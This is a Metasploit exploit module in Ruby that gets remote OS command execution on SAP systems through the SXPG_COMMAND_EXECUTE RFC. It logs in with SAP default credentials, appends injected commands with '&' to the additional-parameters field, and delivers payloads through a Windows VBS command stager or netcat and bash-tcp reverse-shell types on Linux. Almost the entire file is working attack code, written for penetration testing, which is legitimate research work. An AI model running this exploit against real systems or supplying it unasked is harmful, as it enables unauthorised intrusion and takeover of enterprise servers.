##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

##
# This module is based on, inspired by, or is a port of a plugin
# available in the Onapsis Bizploit Opensource ERP Penetration Testing
# framework - http://www.onapsis.com/research-free-solutions.php.
# Mariano Nunez (the author of the Bizploit framework) helped me in my
# efforts in producing the Metasploit modules and was happy to share his
# knowledge and experience - a very cool guy.
#
# The following guys from ERP-SCAN deserve credit for their
# contributions Alexandr Polyakov, Alexey Sintsov, Alexey Tyurin, Dmitry
# Chastukhin and Dmitry Evdokimov.
#
# I'd also like to thank Chris John Riley, Ian de Villiers and Joris van
# de Vis who have Beta tested the modules and provided excellent
# feedback. Some people just seem to enjoy hacking SAP :)
##

require 'msf/core'
require 'msf/core/exploit/sap'

class Metasploit4 < Msf::Exploit::Remote

  Rank = GreatRanking

  include Msf::Exploit::CmdStager
  include Msf::Exploit::SAP::RFC

  def initialize
    super(
      'Name'           => 'SAP RFC SXPG_COMMAND_EXECUTE Remote Command Execution',
      'Description'    => %q{
        This module makes use of the SXPG_COMMAND_EXECUTE Remote Function Call to execute OS commands as configured in SM69.
        The module requires the NW RFC SDK from SAP as well as the Ruby wrapper nwrfc (http://rubygems.org/gems/nwrfc).
      },
      'References' => [[ 'URL', 'https://labs.mwrinfosecurity.com/blog/2012/09/03/sap-parameter-injection/' ]],
      'Platform'       => ['win', 'unix', 'python'],
      'Payload' => {
          'DisableNops' => true
      },
      'Targets' => [
        [ 'Linux',
          {
              'Arch'     => ARCH_CMD,
              'Platform' => 'unix',
              'Payload' => {
                'Space' => 236,
                'Compat' => {
                  'PayloadType' => 'cmd cmd_bash',
                  'RequiredCmd' => 'telnet netcat bash-tcp'
                },
              },
          }
        ],
        [ 'Windows VBS Command Stager',
          {
            'Arch' => [ARCH_X86, ARCH_X86_64],
            'Platform' => 'win'
          }
        ],
        [ 'Python',
          {
            'Arch' => ARCH_PYTHON,
            'Platform' => 'python'
          }
        ]
      ],
      'DefaultTarget' => 2,
      'Privileged' => false,
      'Author' => [ 'nmonkee' ],
      'License' => MSF_LICENSE,
      'DisclosureDate' => 'May 8 2012'
    )

    register_options(
      [
        Opt::RHOST,
        OptString.new('CLIENT', [true, 'Client', '000']),
        OptString.new('USERNAME', [true, 'Username', 'SAP*']),
        OptString.new('PASSWORD', [true, 'Password', '06071992']),
      ], self.class)

    register_advanced_options(
      [
        OptInt.new('PAYLOAD_SPLIT', [true, 'Size of payload segments', '248']),
      ], self.class)

    deregister_options('CMDSTAGER::FLAVOR')
  end

  def exploit

    case target.name
    when /Windows/
      linemax = datastore['PAYLOAD_SPLIT']
      vprint_status("#{datastore['RHOST']}:#{datastore['RPORT']} [SAP] Using custom payload size of #{linemax}") if linemax != 248
      print_status("#{datastore['RHOST']}:#{datastore['RPORT']} [SAP] Sending RFC request")
      execute_cmdstager({ :flavor => :vbs, :delay => 0, :linemax => linemax })
    when /Linux/
      opts = {
        :rhost => rhost,
        :rport => rport,
        :client => client,
        :user => datastore['USERNAME'],
        :pass => datastore['PASSWORD'],
        :bg => true
      }
      res = dbmcli_sxpg_execute(target.name, payload.encoded, opts, false)
      vprint_line res if res
    when /Python/
      python_sxpg_execute(false)
    end
  end

  # Used by the Windows VBS Command Stager
  def execute_command(cmd,opts)
    login(rhost, rport, client, datastore['USERNAME'], datastore['PASSWORD']) do |conn|
      opts = {}
      opts[:COMMANDNAME] = 'ENV' # Env is actually cmd /c set so additional params reduced by 6~7 chars
      opts[:OPERATINGSYSTEM] = 'Windows NT'
      opts[:ADDITIONAL_PARAMETERS] = "&#{cmd.strip}"

      if opts[:ADDITIONAL_PARAMETERS].length > 248
        fail_with(Exploit::Failure::BadConfig, "#{datastore['RHOST']}:#{datastore['RPORT']} [SAP] Command length too long: #{opts[:ADDITIONAL_PARAMETERS].length}")
      end

      begin
        vprint_line sxpg_command_execute(conn, opts)
      rescue NWError => e
        print_error("#{datastore['RHOST']}:#{datastore['RPORT']} [SAP] FunctionCallException - code: #{e.code} group: #{e.group} message: #{e.message} type: #{e.type} number: #{e.number}")
        fail_with(Exploit::Failure::Unknown, "#{datastore['RHOST']}:#{datastore['RPORT']} [SAP] Error injecting command")
      end
    end
  end

end

